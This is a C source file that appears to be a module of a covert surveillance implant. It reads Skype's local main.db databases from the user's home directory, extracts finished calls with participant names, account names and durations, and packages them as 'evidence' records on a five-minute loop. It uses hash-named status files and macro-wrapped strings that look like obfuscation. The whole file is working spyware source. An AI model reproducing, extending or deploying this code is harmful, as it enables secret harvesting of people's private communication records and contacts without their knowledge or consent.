#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <openssl/bio.h>
#include <openssl/md5.h>
#include <sqlite3.h>
#include <linux/limits.h>
#include <glob.h>

#include "module.h"
#include "bioutils.h"
#include "evidencemanager.h"
#include "me.h"
#include "so.h"
#include "runtime.h"

#define ENTRY_OUTGOING 0x00000000
#define ENTRY_INCOMING 0x00000001

#define PROGRAM_SKYPE 0x01

static int skype_getcall(void);
static int skype_getentries(char *maindb);
static int skype_sqlcallback1(void *arg, int num, char **val, char **key);
static int skype_sqlcallback2(void *arg, int num, char **val, char **key);

struct entry {
   time_t timestamp;
   int duration;
   int type;
   int program;
   char *from;
   char *fromname;
   char *to;
   char *toname;
   struct entry *next;
};

static struct entry *list = NULL, *listp = NULL;

static sqlite3 *skype_db;

void *module_call_main(void *args)
{
   BIO *bio_data = NULL;
   char *dataptr = 0;
   long datalen = 0;
   fd_set rfds;
   struct timeval tv;

   debugme("Module CALL started\n");

   do {
      if(!(bio_data = BIO_new(BIO_s_mem()))) break;

      while(MODULE_CALL.status != MODULE_STOPPING) {
         skype_getcall();

         for(listp = list; listp; listp = listp->next) {
            debugme("- CALL %s %s %s %s %d\n", listp->from, listp->fromname, listp->to, listp->toname, listp->duration);
            BIO_write(bio_data, (unsigned int *)&listp->timestamp, 4);
            BIO_write(bio_data, &listp->program, sizeof(listp->program));
            BIO_write(bio_data, &listp->type, sizeof(listp->type));
            if(listp->from) BIO_puts16(bio_data, listp->from);
            BIO_write(bio_data, "\x00\x00", 2);
            if(listp->fromname) BIO_puts16(bio_data, listp->fromname);
            BIO_write(bio_data, "\x00\x00", 2);
            if(listp->to) BIO_puts16(bio_data, listp->to);
            BIO_write(bio_data, "\x00\x00", 2);
            if(listp->toname) BIO_puts16(bio_data, listp->toname);
            BIO_write(bio_data, "\x00\x00", 2);
            BIO_write(bio_data, &listp->duration, sizeof(listp->duration));
            BIO_write(bio_data, "\xDE\xC0\xAD\xAB", 4);
         }

         if((datalen = BIO_get_mem_data(bio_data, &dataptr))) evidence_write(EVIDENCE_TYPE_CALLLIST, NULL, 0, dataptr, datalen);

         (void)BIO_reset(bio_data);

         for(listp = list; listp;) {
            list = listp;
            listp = listp->next;
            if(list->from) free(list->from);
            if(list->fromname) free(list->fromname);
            if(list->to) free(list->to);
            if(list->toname) free(list->toname);
            free(list);
         }
         list = NULL;

         FD_ZERO(&rfds);
         FD_SET(MODULE_CALL.event, &rfds);
         tv.tv_sec = 300;
         tv.tv_usec = 0;
         select(MODULE_CALL.event + 1, &rfds, NULL, NULL, &tv);
      }
   } while(0);
   if(bio_data) BIO_free(bio_data);

   debugme("Module CALL stopped\n");

   return NULL;
}

static int skype_getcall(void)
{
   char file[PATH_MAX];
   glob_t maindb = {0};
   int i;

   do {
      if(initlib(INIT_LIBSQLITE3)) break;
      if(snprintf(file, sizeof(file), SO"%s/.Skype/*/main.db", getenv(SO"HOME")) >= sizeof(file)) break;
      if(glob(file, GLOB_NOSORT, NULL, &maindb)) break;
      for(i = 0; i < maindb.gl_pathc; i++) skype_getentries(maindb.gl_pathv[i]);
   } while(0);
   globfree(&maindb);

   return 0;
}

static int skype_getentries(char *maindb)
{
   FILE *fp = NULL;
   char line[4096];
   unsigned char md5[MD5_DIGEST_LENGTH];
   char statusfile[2 + (MD5_DIGEST_LENGTH * 2) + 1];
   char query[512];
   time_t timestamp = 0;

   do {
      debugme("CALL Database: %s\n", maindb);

      MD5((unsigned char *)maindb, strlen(maindb), md5);

      snprintf(statusfile, sizeof(statusfile), SO"CL%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x",
                                               md5[0], md5[1], md5[2], md5[3], md5[4], md5[5], md5[6], md5[7], md5[8], md5[9], md5[10], md5[11], md5[12], md5[13], md5[14], md5[15]);

      do {
         if(!(fp = fopen(statusfile, "r"))) break;
         if(!fgets(line, sizeof(line), fp)) break;
         timestamp = atol(line);
      } while(0);
      if(fp) fclose(fp);

      if(sqlite3_open(maindb, &skype_db) != SQLITE_OK) break;
      if(snprintf(query, sizeof(query), SO"SELECT CA.id, begin_timestamp, duration, is_incoming, is_conference, A.skypename, A.fullname, host_identity, CO.displayname FROM Calls AS CA JOIN Accounts AS A LEFT JOIN Contacts AS CO ON host_identity = CO.skypename WHERE is_active = 0 AND begin_timestamp > %lu ORDER BY begin_timestamp", timestamp) >= sizeof(query)) break;
      if(sqlite3_exec(skype_db, query, skype_sqlcallback1, (void *)&timestamp, NULL) != SQLITE_OK) break;
   } while(0);
   if(skype_db) {
      sqlite3_close(skype_db);
      skype_db = NULL;
   }

   do {
      if(!(fp = fopen(statusfile, "w"))) break;
      fprintf(fp, "%lu\n", timestamp);
   } while(0);
   if(fp) fclose(fp);

   return 0;
}

static int skype_sqlcallback1(void *arg, int num, char **val, char **key)
{
   char query[512];

   do {
      *((int *)arg) = val[1] ? atoi(val[1]) : 0;

      if(!list) {
         if(!(list = malloc(sizeof(struct entry)))) break;
         listp = list;
      } else {
         if(!(listp->next = malloc(sizeof(struct entry)))) break;
         listp = listp->next;
      }
      memset(listp, 0, sizeof(struct entry));

      listp->timestamp = val[1] ? atol(val[1]) : 0;
      listp->duration = val[2] ? atoi(val[2]) : 0;
      listp->type = (val[3] && atoi(val[3])) ? ENTRY_INCOMING : ENTRY_OUTGOING;
      listp->program = PROGRAM_SKYPE;

      if(val[3] && !atoi(val[3])) {
         if(val[5]) listp->from = strdup(val[5]);
         if(val[6]) listp->fromname = strdup(val[6]);
      } else if(val[3] && atoi(val[3])) {
         if(val[5]) listp->to = strdup(val[5]);
         if(val[6]) listp->toname = strdup(val[6]);
         if(val[4] && atoi(val[4])) {
            if(val[7]) listp->from = strdup(val[7]);
            if(val[8]) listp->fromname = strdup(val[8]);
         }
      }

      if(snprintf(query, sizeof(query), SO"SELECT identity, displayname, %d, %d FROM CallMembers JOIN Contacts ON identity = skypename WHERE call_db_id = %u AND NOT identity = '%s'", (val[3] ? atoi(val[3]) : 0), (val[4] ? atoi(val[4]) : 0), atoi(val[0]), val[7]) >= sizeof(query)) break;
      if(sqlite3_exec(skype_db, query, skype_sqlcallback2, (void *)listp, NULL) != SQLITE_OK) break;
   } while(0);

   return 0;
}

static int skype_sqlcallback2(void *arg, int num, char **val, char **key)
{
   struct entry *e = arg;
   char *buf = NULL;

   if(atoi(val[2]) && !atoi(val[3])) {
      if(!e->from) {
         e->from = strdup(val[0]);
      } else {
         asprintf(&buf, "%s,%s", e->from, val[0]);
         free(e->from);
         e->from = buf;
         buf = NULL;
      }

      if(!e->fromname) {
         e->fromname = strdup(val[1]);
      } else {
         asprintf(&buf, "%s, %s", e->fromname, val[1]);
         free(e->fromname);
         e->fromname = buf;
         buf = NULL;
      }
   } else {
      if(!e->to) {
         e->to = strdup(val[0]);
      } else {
         asprintf(&buf, "%s,%s", e->to, val[0]);
         free(e->to);
         e->to = buf;
         buf = NULL;
      }

      if(!e->toname) {
         e->toname = strdup(val[1]);
      } else {
         asprintf(&buf, "%s, %s", e->toname, val[1]);
         free(e->toname);
         e->toname = buf;
         buf = NULL;
      }
   }

   return 0;
}
